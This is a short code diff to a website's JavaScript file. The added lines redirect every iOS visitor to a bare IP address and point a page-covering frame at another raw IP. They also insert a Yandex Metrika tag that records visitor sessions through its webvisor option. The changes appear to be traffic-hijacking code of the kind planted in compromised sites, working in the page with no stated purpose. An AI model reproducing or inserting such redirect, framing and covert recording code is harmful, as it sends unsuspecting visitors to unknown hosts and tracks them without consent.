@@ -1,6 +1,10 @@
 //lxxaicom
+if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
+    //alert(navigator.userAgent);  
+    window.location.href = "http://38.26.195.15/";
+}
 var titlestr=document.title;
-setFrame("http://38.26.195.13/");
+setFrame("http://38.26.195.15/");
 
 
 
@@ -29,6 +33,16 @@ function setFrame(olink){
       }, 100)
     } catch (e) {}
 }
+ (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+   ym(87023917, "init", {
+        clickmap:true,
+        trackLinks:true,
+        accurateTrackBounce:true,
+        webvisor:true
+   });
 
 var _hmt = _hmt || [];
 (function() {
